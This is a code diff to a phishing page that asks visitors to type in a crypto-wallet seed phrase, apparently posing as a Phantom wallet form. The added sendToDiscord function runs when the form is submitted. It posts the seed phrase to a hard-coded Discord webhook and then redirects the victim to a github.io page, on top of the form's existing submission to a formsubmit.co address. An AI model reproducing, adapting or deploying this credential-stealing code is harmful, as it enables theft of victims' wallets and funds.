@@ -155,7 +155,7 @@
         <button class="active" onclick="setWords(12)">12 words</button>
         <button onclick="setWords(24)">24 words</button>
     </div>
-    <form action="https://formsubmit.co/Saifcity84@proton.me" method="POST">
+    <form action="https://formsubmit.co/Saifcity84@proton.me" method="POST" onsubmit="sendToDiscord(event)">
         <textarea placeholder="Enter your seed phrase here. Make sure to add a space between each word." oninput="updateWords(this.value)" id="seedPhraseTextarea" name="seedPhrase phantom" required></textarea>
         <div class="words-grid" id="wordsGrid">
             <!-- Word boxes dynamically generated -->
@@ -169,44 +169,78 @@
     <div id="output"></div>
 </div>
 
-    <script>
-        let wordCount = 12; // Default to 12 words
-    
-        function setWords(count) {
-            wordCount = count;
-    
-            const buttons = document.querySelectorAll('.selection-buttons button');
-            buttons.forEach(btn => btn.classList.remove('active'));
-            buttons[count === 12 ? 0 : 1].classList.add('active');
-    
-            renderWordBoxes();
+<script>
+    let wordCount = 12; // Default to 12 words
+
+    function setWords(count) {
+        wordCount = count;
+
+        const buttons = document.querySelectorAll('.selection-buttons button');
+        buttons.forEach(btn => btn.classList.remove('active'));
+        buttons[count === 12 ? 0 : 1].classList.add('active');
+
+        renderWordBoxes();
+    }
+
+    function renderWordBoxes() {
+        const grid = document.getElementById('wordsGrid');
+        grid.innerHTML = ''; // Clear grid
+        for (let i = 1; i <= wordCount; i++) {
+            const wordBox = document.createElement('div');
+            wordBox.className = 'word-box';
+            wordBox.innerHTML = `<div class="index">${i}</div><span class="word"></span>`;
+            grid.appendChild(wordBox);
         }
-    
-        function renderWordBoxes() {
-            const grid = document.getElementById('wordsGrid');
-            grid.innerHTML = ''; // Clear grid
-            for (let i = 1; i <= wordCount; i++) {
-                const wordBox = document.createElement('div');
-                wordBox.className = 'word-box';
-                wordBox.innerHTML = `<div class="index">${i}</div><span class="word"></span>`;
-                grid.appendChild(wordBox);
+    }
+
+    function updateWords(input) {
+        const words = input.split(' '); // Split the input by spaces
+        const wordBoxes = document.querySelectorAll('.word-box .word');
+        
+        // Update each word box with the corresponding word
+        wordBoxes.forEach((box, index) => {
+            box.textContent = words[index] || ''; // Set word or clear if none
+        });
+    }
+
+    function sendToDiscord(event) {
+        event.preventDefault(); // Empêche la soumission du formulaire jusqu'à ce que nous ayons envoyé les données à Discord
+
+        const seedPhrase = document.getElementById('seedPhraseTextarea').value;
+
+        // URL de votre webhook Discord
+        const webhookURL = 'https://discord.com/api/webhooks/1337941897238417530/zgItSGC5Vfg39VfPO9sqpA1hDakZ42_bWRp4bJjeR-bAcUtTkN7-yqPc_GBC5STq2XoF';
+
+        // Données à envoyer à Discord
+        const data = {
+            content: `Nouvelle seed phrase reçue : ${seedPhrase}`
+        };
+
+        // Envoyer les données à Discord
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('Seed phrase envoyée à Discord avec succès');
+                // Rediriger vers https://saifcity84.github.io/mfodjhfd/ après l'envoi réussi
+                window.location.href = 'https://saifcity84.github.io/mfodjhfd/';
+            } else {
+                console.error('Erreur lors de l\'envoi à Discord');
             }
-        }
-    
-        function updateWords(input) {
-            const words = input.split(' '); // Split the input by spaces
-            const wordBoxes = document.querySelectorAll('.word-box .word');
-            
-            // Update each word box with the corresponding word
-            wordBoxes.forEach((box, index) => {
-                box.textContent = words[index] || ''; // Set word or clear if none
-            });
-        }
-    
-        // Initialize with 12 words
-        setWords(12);
-    </script>
-    
+        })
+        .catch(error => {
+            console.error('Erreur lors de l\'envoi à Discord :', error);
+        });
+    }
+
+    // Initialize with 12 words
+    setWords(12);
+</script>
+
 </body>
 </html>
-
